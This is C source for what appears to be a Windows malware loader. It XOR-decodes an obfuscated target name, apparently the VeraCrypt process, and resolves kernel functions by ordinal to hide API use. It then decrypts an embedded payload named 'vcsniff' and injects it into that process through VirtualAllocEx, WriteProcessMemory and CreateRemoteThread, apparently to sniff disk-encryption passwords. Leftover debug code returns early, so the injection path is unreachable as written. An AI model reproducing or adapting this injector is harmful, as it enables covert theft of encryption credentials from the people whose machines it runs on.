#include <Windows.h>

#include "vcsniff.bin.inc"

#define UTILS_IMPLEMENTATION
#include "../utils.h"

void test()
{
    printf("test\n");
}

int main()
{

    HMODULE hKernel = MyGetKernelModuleHandle();

    if (hKernel == NULL)
    {
        printf("Could not get kernel module\n");
        goto shutdown;
    }

    PopulateKernelFunctionPtrsByOrdinal(hKernel);

    char test_data[14] = {0};
    double d = 0.00002;

    printf("%p %p\n", test_data, &d);

    getchar();
    MyMemCpy(test_data, &d, 14);

    getchar();

    return 0;

    char cVeraCrypt[] = {0x66, 0x55, 0x42, 0x51, 0x73, 0x42, 0x49, 0x40, 0x44, 0x1e, 0x55, 0x48, 0x55, 0x0};
    MyXor(cVeraCrypt, 13, key, 5);

    DWORD dwProcID = FindTargetProcessID(cVeraCrypt);

    if (dwProcID == -1)
    {
        printf("Could not get proc id\n");
        goto shutdown;
    }

    HANDLE hProc = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcID);
    if (hProc == NULL)
    {
        printf("OpenProcess failed with %d\n", pGetLastError());
        goto shutdown;
    }

    LPVOID lpvExecMem = pVirtualAllocEx(hProc, NULL, vcsniff_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (lpvExecMem == NULL)
    {
        printf("VirtualAllocEx failed with %d\n", pGetLastError());
        goto shutdown;
    }

    MyXor(vcsniff_data, vcsniff_data_len, key, 5);

    if (!pWriteProcessMemory(hProc, lpvExecMem, vcsniff_data, vcsniff_data_len, NULL))
    {
        printf("WriteProcessMemory failed with %d\n", pGetLastError());
        goto shutdown;
    }

    DWORD dwOldProtect = 0;

    if (!pVirtualProtectEx(hProc, lpvExecMem, vcsniff_data_len, PAGE_EXECUTE_READ, &dwOldProtect))
    {
        printf("VirtualProtectEx failed with %d\n", pGetLastError());
        goto shutdown;
    }

    HANDLE hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpvExecMem, NULL, 0, NULL);

    if (hThread != NULL)
    {
        pWaitForSingleObject(hThread, INFINITE);
        pCloseHandle(hThread);
    }

shutdown:

    if (hProc != NULL)
    {
        pCloseHandle(hProc);
    }

    return 0;
}